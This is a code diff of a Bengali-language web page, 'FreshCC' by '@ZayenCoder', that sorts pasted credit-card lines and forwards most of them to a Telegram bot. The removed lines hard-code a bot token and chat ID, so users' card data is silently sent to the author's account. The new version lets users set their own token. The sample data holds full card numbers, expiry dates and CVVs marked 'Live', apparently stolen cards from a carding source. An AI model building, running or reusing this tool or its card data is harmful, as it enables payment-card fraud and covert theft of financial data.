@@ -2,52 +2,85 @@
 <html lang="bn">
 <head>
     <meta charset="UTF-8">
-    <title>FreshCC - Telegram Auto Forward (Ryan's Bot)</title>
+    <title>FreshCC - Telegram Auto Forward</title>
     <style>
         body {
-            background: linear-gradient(135deg, #0f0c29, #302b63);
             font-family: monospace;
+            background: linear-gradient(135deg, #1a1a2e, #16213e);
+            color: white;
             padding: 20px;
         }
         .container {
-            max-width: 800px;
+            max-width: 900px;
             margin: 0 auto;
-            background: #fff;
+            background: #0f0f1a;
             border-radius: 16px;
             padding: 25px;
         }
         textarea {
             width: 100%;
             padding: 12px;
-            font-family: monospace;
-            border: 2px solid #667eea;
+            background: #1a1a2e;
+            color: #0f0;
+            border: 1px solid #333;
             border-radius: 8px;
+            font-family: monospace;
         }
         button {
-            background: #667eea;
-            color: white;
+            background: #00ff88;
+            color: #000;
             border: none;
             padding: 12px 24px;
             border-radius: 8px;
             cursor: pointer;
+            font-weight: bold;
             margin: 10px 5px;
         }
-        .output {
+        .settings {
             background: #1a1a2e;
-            color: #0f0;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 15px 0;
+        }
+        input {
+            width: 100%;
+            padding: 8px;
+            margin: 5px 0;
+            background: #0f0f1a;
+            color: white;
+            border: 1px solid #333;
+            border-radius: 5px;
+        }
+        .output {
+            background: #0a0a0f;
             padding: 15px;
             border-radius: 8px;
             margin-top: 15px;
-            white-space: pre-wrap;
+            font-size: 12px;
         }
-        .success { background: #d4edda; color: #155724; padding: 10px; margin: 10px 0; border-radius: 5px; }
-        .error { background: #f8d7da; color: #721c24; padding: 10px; margin: 10px 0; border-radius: 5px; }
+        .status {
+            padding: 10px;
+            border-radius: 5px;
+            margin: 10px 0;
+        }
+        .green { background: #00ff8811; color: #0f0; border-left: 3px solid #0f0; }
+        .red { background: #ff000011; color: #f00; border-left: 3px solid #f00; }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>🔐 FreshCC <span style="color:#667eea">@ZayenCoder</span></h1>
-        <p>📌 কার্ড ইনপুট দিন → প্রথম ২টি এখানে থাকবে → বাকিগুলো <strong>Telegram (@userCardinfobot)</strong> এ যাবে</p>
+        <h1>🔐 FreshCC <span style="color:#00ff88">@ZayenCoder</span></h1>
+        <p>📌 প্রথম ২টি কার্ড এখানে থাকবে + বাকিগুলো <strong style="color:#00ff88">Telegram এ ফরওয়ার্ড</strong> হবে</p>
+
+        <!-- Telegram সেটিংস -->
+        <div class="settings">
+            <h3>🤖 Telegram বট সেটিংস (100% ফ্রি)</h3>
+            <label>🔑 Bot Token:</label>
+            <input type="text" id="botToken" placeholder="@BotFather থেকে টোকেন নিন" value="">
+            <label>📱 Your Chat ID:</label>
+            <input type="text" id="chatId" placeholder="@userinfobot থেকে Chat ID নিন" value="">
+            <button onclick="saveSettings()">💾 সেভ করুন</button>
+        </div>
 
         <textarea id="inputData" rows="8" placeholder="পেস্ট করুন আপনার কার্ড ডাটা..."></textarea>
         
@@ -69,16 +102,26 @@
             <pre id="restCards">—</pre>
         </div>
 
-        <div style="text-align:center; margin-top:20px; color:#888;">
-            🤖 Telegram Bot: <strong>@userCardinfobot</strong> | Chat ID: <strong>5803440437</strong> | © FreshCC
+        <div style="text-align: center; margin-top: 20px; color: #666;">
+            © 2026 FreshCC by ZayenCoder | Telegram Forwarder (Free)
         </div>
     </div>
 
     <script>
-        // ✅ আপনার কনফিগারেশন (Chat ID বসানো হয়েছে)
-        const BOT_TOKEN = "8602982031:AAF71cFUjb7Qj7hnU3QwVgxecsZVtYLTWTc";
-        const CHAT_ID = "5803440437";  // আপনার Chat ID
-
+        // সেভ করা সেটিংস লোড
+        function loadSettings() {
+            const botToken = localStorage.getItem('telegram_bot_token');
+            const chatId = localStorage.getItem('telegram_chat_id');
+            if (botToken) document.getElementById('botToken').value = botToken;
+            if (chatId) document.getElementById('chatId').value = chatId;
+        }
+        
+        function saveSettings() {
+            localStorage.setItem('telegram_bot_token', document.getElementById('botToken').value);
+            localStorage.setItem('telegram_chat_id', document.getElementById('chatId').value);
+            showStatus('✅ সেটিংস সেভ হয়েছে!', 'green');
+        }
+        
         function extractCards(text) {
             const lines = text.trim().split('\n');
             const cards = [];
@@ -89,75 +132,96 @@
             }
             return cards;
         }
-
-        async function sendToTelegram(cards) {
-            if (!CHAT_ID) {
-                return { success: false, message: "⚠️ Chat ID সেট করা হয়নি!" };
+        
+        async function sendToTelegram(cards, botToken, chatId) {
+            if (!botToken || !chatId || cards.length === 0) {
+                return { success: false, message: 'Telegram সেটিংস নেই বা কোনো কার্ড নেই' };
             }
-
-            const message = `🆕 *FreshCC থেকে নতুন কার্ড*\n\n📋 *মোট:* ${cards.length} টি\n━━━━━━━━━━━━━━━━━\n${cards.map((c, i) => `${i+1}. \`${c}\``).join('\n')}\n━━━━━━━━━━━━━━━━━\n⏰ ${new Date().toLocaleString()}\n🔗 @ZayenCoder | FreshCC`;
-
+            
+            const message = `🆕 *FreshCC থেকে নতুন কার্ড*\n\n📋 *মোট:* ${cards.length} টি\n\n` +
+                           cards.map((c, i) => `${i+1}. \`${c}\``).join('\n') +
+                           `\n\n⏰ ${new Date().toLocaleString()}\n🔗 @ZayenCoder`;
+            
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            
             try {
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                const response = await fetch(url, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
+                    body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'Markdown' })
                 });
                 const result = await response.json();
-                
-                if (result.ok) return { success: true, message: `✅ ${cards.length} টি কার্ড Telegram এ পাঠানো হয়েছে` };
-                else return { success: false, message: `❌ Error: ${result.description}` };
+                if (result.ok) {
+                    return { success: true, message: `✅ ${cards.length} টি কার্ড Telegram এ পাঠানো হয়েছে` };
+                } else {
+                    return { success: false, message: `❌ Telegram Error: ${result.description}` };
+                }
             } catch (error) {
                 return { success: false, message: `❌ Connection Error: ${error.message}` };
             }
         }
-
+        
+        function showStatus(msg, type) {
+            const statusDiv = document.getElementById('status');
+            statusDiv.innerHTML = `<div class="status ${type}">${msg}</div>`;
+            setTimeout(() => {
+                if (statusDiv.innerHTML === `<div class="status ${type}">${msg}</div>`) {
+                    statusDiv.innerHTML = '';
+                }
+            }, 8000);
+        }
+        
         async function processAndForward() {
             const input = document.getElementById('inputData').value;
+            const botToken = document.getElementById('botToken').value;
+            const chatId = document.getElementById('chatId').value;
             
             if (!input.trim()) {
-                document.getElementById('status').innerHTML = '<div class="error">❌ দয়া করে কিছু ইনপুট দিন!</div>';
+                showStatus('❌ দয়া করে কিছু ইনপুট দিন!', 'red');
                 return;
             }
-
+            
             const allCards = extractCards(input);
             
             if (allCards.length === 0) {
-                document.getElementById('status').innerHTML = '<div class="error">❌ কোনো বৈধ কার্ড পাওয়া যায়নি!</div>';
+                showStatus('❌ কোনো বৈধ কার্ড পাওয়া যায়নি!', 'red');
                 return;
             }
-
+            
             const firstTwo = allCards.slice(0, 2);
             const restCards = allCards.slice(2);
-
+            
             document.getElementById('firstTwo').textContent = firstTwo.join('\n') || '(কোনো কার্ড নেই)';
             document.getElementById('restCards').textContent = restCards.join('\n') || '(কোনো কার্ড নেই)';
-
-            document.getElementById('status').innerHTML = `<div class="success">📊 মোট ${allCards.length} টি কার্ড | প্রথম ২টি এখানে রাখা হয়েছে</div>`;
-
+            
+            showStatus(`📊 মোট ${allCards.length} টি কার্ড | প্রথম ২টি এখানে রাখা হয়েছে`, 'green');
+            
             if (restCards.length > 0) {
-                const result = await sendToTelegram(restCards);
-                document.getElementById('status').innerHTML += `<div class="${result.success ? 'success' : 'error'}">${result.message}</div>`;
+                const result = await sendToTelegram(restCards, botToken, chatId);
+                showStatus(result.message, result.success ? 'green' : 'red');
             } else {
-                document.getElementById('status').innerHTML += '<div class="success">ℹ️ ২টির বেশি কার্ড নেই, ফরওয়ার্ড করার কিছু নেই</div>';
+                showStatus('ℹ️ ২টির বেশি কার্ড নেই, ফরওয়ার্ড করার কিছু নেই', 'green');
             }
         }
-
+        
         function loadSample() {
-            document.getElementById('inputData').value = `Live | 5154620022516551|02|2028|437| [Charge :$2,5]
-Live | 5154620022755043|02|2028|622| [Charge :$8,2]
-Live | 5154620022178428|02|2028|877| [Charge :$4,6]
-Live | 5154620022568438|02|2028|556| [Charge :$2,0]
-Live | 5154620022337289|02|2028|804| [Charge :$5,1]`;
-            document.getElementById('status').innerHTML = '<div class="success">📝 স্যাম্পল লোড হয়েছে</div>';
+            document.getElementById('inputData').value = `Live | 5154620022516551|02|2028|437| [Charge :$2,5] [BIN: - - - ] [GATE:01] ./Altenen Server
+Live | 5154620022755043|02|2028|622| [Charge :$8,2] [BIN: - - - ] [GATE:01] ./Altenen Server
+Live | 5154620022178428|02|2028|877| [Charge :$4,6] [BIN: - - - ] [GATE:01] ./Altenen Server
+Live | 5154620022568438|02|2028|556| [Charge :$2,0] [BIN: - - - ] [GATE:01] ./Altenen Server
+Live | 5154620022337289|02|2028|804| [Charge :$5,1] [BIN: - - - ] [GATE:01] ./Altenen Server`;
+            showStatus('📝 স্যাম্পল লোড হয়েছে', 'green');
         }
-
+        
         function clearAll() {
             document.getElementById('inputData').value = '';
             document.getElementById('firstTwo').textContent = '—';
             document.getElementById('restCards').textContent = '—';
             document.getElementById('status').innerHTML = '';
+            showStatus('🧹 সব ক্লিয়ার করা হয়েছে', 'green');
         }
+        
+        loadSettings();
     </script>
 </body>
 </html>
